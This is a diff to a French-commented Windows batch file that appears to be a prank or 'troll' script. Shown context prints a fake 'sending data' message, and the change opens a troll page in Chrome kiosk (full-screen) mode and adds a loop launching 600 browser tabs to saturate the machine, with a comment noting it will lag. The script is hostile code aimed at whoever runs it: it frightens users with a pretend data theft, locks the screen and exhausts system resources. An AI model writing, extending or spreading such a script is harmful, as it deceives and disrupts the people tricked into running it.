@@ -8,11 +8,13 @@ timeout /t 2 >nul
 echo Envoi des données...
 timeout /t 2 >nul
 
-:: Ouvre la page du troll
+:: Ouvre la page du troll en plein écran
 start chrome --kiosk "https://member-cleanup.vercel.app"
-timeout /t 1 >nul
+timeout /t 2 >nul
 
-:: Ouvre d'autres sites (pour saturer)
-start chrome "https://www.roblox.com"
-start chrome "https://www.youtube.com"
-start chrome "https://www.google.com/search?q=666"
+:: Boucle pour ouvrir 200 pages (attention, ça va ramer !)
+for /l %%x in (1, 1, 200) do (
+    start chrome "https://www.roblox.com"
+    start chrome "https://www.youtube.com"
+    start chrome "https://www.google.com/search?q=666"
+)
